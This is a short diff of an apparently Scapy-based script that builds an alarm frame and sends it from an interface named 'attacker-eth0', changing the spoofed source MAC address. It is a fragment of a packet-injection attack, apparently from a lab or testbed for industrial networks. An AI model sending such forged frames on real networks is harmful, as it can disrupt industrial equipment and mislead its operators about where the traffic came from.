@@ -38,5 +38,5 @@ def get_alarm_msg(dst, src):
     return ether / cyclic_packet / alarm_header
 
 
-msg = get_alarm_msg(dst="00:1D:9C:C7:B0:70", src="00:1D:9C:C7:B0:11")
+msg = get_alarm_msg(dst="00:1D:9C:C7:B0:70", src="00:1D:9C:C8:BD:13")
 sendp(msg, iface="attacker-eth0", verbose=False)
